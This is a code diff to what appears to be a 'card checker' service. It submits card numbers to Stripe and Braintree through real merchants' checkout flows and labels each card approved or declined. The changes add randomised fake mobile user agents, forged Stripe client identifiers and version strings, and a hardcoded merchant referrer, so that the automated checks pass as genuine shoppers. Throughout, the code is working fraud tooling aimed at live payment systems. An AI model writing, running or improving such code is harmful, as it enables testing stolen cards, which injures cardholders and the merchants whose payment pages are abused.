@@ -26,6 +26,8 @@ logger = logging.getLogger(__name__)
 APPROVED = '𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅'
 DECLINED = '𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌'
 ERROR = '𝙀𝙍𝙍𝙊𝙍 ⚠️'
+SUCCESS = '𝓢𝓤𝓒𝓒𝓔𝓢𝓢 ✅'
+FAILED = '𝙁𝘼𝙄𝙇𝙀𝘿 ❌'
 
 # Configuration
 REQUEST_TIMEOUT = 60  # Increased from 15 to allow more time for external API calls
@@ -67,6 +69,17 @@ def rate_limited(max_per_minute):
             return func(*args, **kwargs)
         return wrapped
     return decorator
+
+def generate_fake_user_agent():
+    """Generate a realistic random User-Agent"""
+    versions = [
+        "137.0.0.0", "138.0.0.0", "139.0.0.0", "140.0.0.0", 
+        "141.0.0.0", "142.0.0.0", "143.0.0.0"
+    ]
+    android_versions = [10, 11, 12, 13, 14]
+    devices = ["SM-G991B", "SM-G998B", "Pixel 6", "Pixel 7", "Mi 11"]
+    
+    return f"Mozilla/5.0 (Linux; Android {random.choice(android_versions)}; {random.choice(devices)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.choice(versions)} Mobile Safari/537.36"
 
 def fetch_city_zipcode_data():
     """Fetch US geographic data from GitHub repository with caching"""
@@ -120,7 +133,7 @@ def generate_random_person():
         'state': state,
         'zipcode': zipcode,
         'country': "United States",
-        'user_agent': fake.user_agent(),
+        'user_agent': generate_fake_user_agent(),
     }
 
 def _format_phone_number(zipcode):
@@ -277,7 +290,7 @@ def extract_payment_config(card_number, random_person, gateway_config, session=N
         return result
     
 @validate_input
-def get_stripe_auth_id(random_person, card_info, pk_live, accountId, email, url):
+def get_stripe_auth_id(random_person, card_info, publishable_key, account_id, url):
     """Generate payment token through Braintree API"""
     parsed_url = urlparse(url)
     origin = f"{parsed_url.scheme}://{parsed_url.netloc}"
@@ -299,30 +312,24 @@ def get_stripe_auth_id(random_person, card_info, pk_live, accountId, email, url)
     }
 
     payload = {
-        'billing_details[name]': " ",
-        'billing_details[email]': email,
-        'billing_details[address][country]': "US",
         'type': "card",
-        'card[number]': formatted_card_number,
+        'billing_details[name]': f"{random_person['first_name']} {random_person['last_name']}",
+        'card[number]': card_info['number'],
         'card[cvc]': card_info['cvv'],
-        'card[exp_year]': year_short,
         'card[exp_month]': card_info['month'],
-        'allow_redisplay': "unspecified",
-        'pasted_fields': "number",
-        'payment_user_agent': "stripe.js/b85ba7b837; stripe-js-v3/b85ba7b837; payment-element; deferred-intent",
-        'referrer': origin,
+        'card[exp_year]': year_short,
+        'guid': str(fake.uuid4()),
+        'muid': str(fake.uuid4()),
+        'sid': str(fake.uuid4()),
+        'payment_user_agent': f"stripe.js/{random.randint(280000000, 290000000)}; stripe-js-v3/{random.randint(280000000, 290000000)}; card-element",
+        'referrer': "https://fuelgreatminds.com",
         'time_on_page': time_on_page,
-        'client_attribution_metadata[client_session_id]': fake.uuid4(),
+        'client_attribution_metadata[client_session_id]': str(fake.uuid4()),
         'client_attribution_metadata[merchant_integration_source]': "elements",
-        'client_attribution_metadata[merchant_integration_subtype]': "payment-element",
-        'client_attribution_metadata[merchant_integration_version]': "2021",
-        'client_attribution_metadata[payment_intent_creation_flow]': "deferred",
-        'client_attribution_metadata[payment_method_selection_flow]': "merchant_specified",
-        'guid': fake.uuid4(),
-        'muid': fake.uuid4(),
-        'sid': fake.uuid4(),
-        'key': pk_live,
-        '_stripe_account': accountId
+        'client_attribution_metadata[merchant_integration_subtype]': "card-element",
+        'client_attribution_metadata[merchant_integration_version]': "2017",
+        'key': publishable_key,
+        '_stripe_account': account_id
     }
 
     try:
@@ -447,6 +454,11 @@ def generate_payload_payment(card_number, random_person, gateway_config, card_in
     if "Braintree Auth" in gateway_config['gateway_type']:
         
         if "v1_with_cookies" in gateway_config['version']:
+            required_gateway_fields = ['cookies', 'url', 'access_token', 'success_message', 'error_message', 'post_url']
+            for field in required_gateway_fields:
+                if field not in gateway_config:
+                    logger.error(f"Missing required field in gateway config: {field}")
+                    return False, f"{field} is missing in gateway config"
             if not (nonce := secrets.get('nonce')):
                 logger.error("Failed to fetch nonce")
                 return False, "Failed to fetch nonce"
@@ -500,6 +512,11 @@ def generate_payload_payment(card_number, random_person, gateway_config, card_in
             }
         
         elif "v3_with_cookies" in gateway_config['version']:
+            required_gateway_fields = ['cookies', 'url', 'access_token', 'success_message', 'error_message']
+            for field in required_gateway_fields:
+                if field not in gateway_config:
+                    logger.error(f"Missing required field in gateway config: {field}")
+                    return False, f"{field} is missing in gateway config"
             payload_auth = {
                 "clientSdkMetadata": {
                     "source": "client",
@@ -577,6 +594,11 @@ def generate_payload_payment(card_number, random_person, gateway_config, card_in
 
     elif "Stripe Auth" in gateway_config['gateway_type']:
         if "v1_with_cookies" in gateway_config['version']:
+            required_gateway_fields = ['cookies', 'url', 'post_url']
+            for field in required_gateway_fields:
+                if field not in gateway_config:
+                    logger.error(f"Missing required field in gateway config: {field}")
+                    return False, f"{field} is missing in gateway config"
 
             if not (pk_live := secrets.get('pk_live')):
                 logger.error("Failed to fetch pk live")
@@ -590,7 +612,7 @@ def generate_payload_payment(card_number, random_person, gateway_config, card_in
                 logger.error("Failed to fetch email")
                 return False, "Failed to fetch email"
             
-            if not (payment_id := get_stripe_auth_id(random_person, card_info, pk_live, accountId, email, gateway_config['url'])):
+            if not (payment_id := get_stripe_auth_id(random_person, card_info, pk_live, accountId, gateway_config['url'])):
                 logger.error("Failed to fetch ID")
                 return False, "Failed to fetch ID"
             
@@ -662,12 +684,12 @@ def _parse_payment_response(card_number, content, random_person, gateway_config,
             # Check for success in JSON response
             if data.get('success') is True:
                 message = 'Approved'
-                return APPROVED, message
+                return SUCCESS, message
             
             # Check for error in JSON response
             error_message = data.get('data', {}).get('error', {}).get('message', 'Unknown error').split('Error: ')[-1]
                 
-            return DECLINED, error_message
+            return FAILED, error_message
             
         except json.JSONDecodeError:
             # If not JSON, parse as HTML
@@ -762,12 +784,6 @@ def handle_payment():
         if not gateway_config:
             logger.error("Missing gateway configuration")
             return jsonify({"status": ERROR, "result": "Gateway configuration is missing"}), 400
-        
-        required_gateway_fields = ['cookies', 'url', 'access_token', 'success_message', 'error_message', 'gateway_type']
-        for field in required_gateway_fields:
-            if field not in gateway_config:
-                logger.error(f"Missing required field in gateway config: {field}")
-                return jsonify({"status": ERROR, "result": f"{field} is missing in gateway config"}), 400
         
         # Validate card information
         card_info = data.get('card')
